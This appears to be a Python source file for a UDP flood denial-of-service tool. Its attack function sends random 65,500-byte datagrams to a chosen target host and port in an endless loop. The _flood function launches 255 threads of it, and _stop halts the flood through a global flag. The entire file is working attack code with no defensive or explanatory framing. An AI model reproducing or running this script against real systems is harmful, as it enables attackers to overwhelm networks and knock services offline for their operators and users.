import socket
from random import _urandom
from threading import Thread

atacar = True

def attack(TARGET,PORT):
    global atacar
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while atacar:
        bytess = _urandom(65500)
        sock.sendto(bytess, (TARGET,PORT))

def _flood(TARGET,PORT):
    global atacar
    atacar = True
    for i in range(255):
        attack_thread = Thread(target=attack, args=(TARGET,PORT,))
        attack_thread.start()

def _stop():
    global atacar
    atacar = False
